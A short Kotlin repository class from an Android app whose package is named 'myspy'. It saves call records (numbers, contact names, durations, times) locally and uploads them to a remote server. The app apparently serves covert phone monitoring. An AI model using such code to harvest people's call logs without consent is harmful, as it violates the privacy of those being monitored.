package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.CallsDao
import com.myspy.android.data.local.db.entities.CallEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.CallData
import java.text.SimpleDateFormat
import java.util.*

class CallsRepository(
    private val callsDao: CallsDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveCall(call: CallEntity): Long = callsDao.insert(call)

    suspend fun saveMultiple(calls: List<CallEntity>) {
        callsDao.insertAll(calls)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = callsDao.getUnsyncedCalls()
            if (unsynced.isEmpty()) return Result.success(0)

            val dataList = unsynced.map { entity ->
                CallData(
                    callType = entity.type,
                    number = entity.number,
                    duration = entity.duration.toInt(),
                    timestamp = dateFormat.format(Date(entity.timestamp)),
                    contactName = entity.contactName
                )
            }

            val response = apiService.uploadCalls(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                callsDao.markAsSynced(unsynced.map { it.id })
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int = callsDao.getUnsyncedCount()
}
